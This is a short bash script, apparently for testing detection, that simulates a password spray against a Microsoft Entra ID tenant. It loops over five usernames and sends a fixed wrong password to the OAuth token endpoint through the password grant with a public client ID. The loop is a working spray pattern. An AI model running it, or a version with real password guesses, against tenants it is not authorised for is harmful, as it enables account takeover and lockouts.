# simulate-spray.sh  — against YOUR tenant only
TENANT="ismaeldavid2010gmail.onmicrosoft.com"     # [VERIFY] your tenant
CLIENT_ID="1950a258-227b-4e31-a9cf-717495945fc2"  # well-known public client [VERIFY still valid]
WRONG_PW="Mr_Kali26."                    # a common-looking wrong password
USERS=("ana" "bobby" "carolin" "dave" "erick")

for U in "${USERS[@]}"; do
  curl -s -X POST "https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token" \
    -d "client_id=${CLIENT_ID}" \
    -d "scope=https://graph.microsoft.com/.default" \
    -d "username=${U}@${TENANT}" \
    -d "password=${WRONG_PW}" \
    -d "grant_type=password" \
    -o /dev/null -w "%{http_code} ${U}\n"
  sleep 2
done
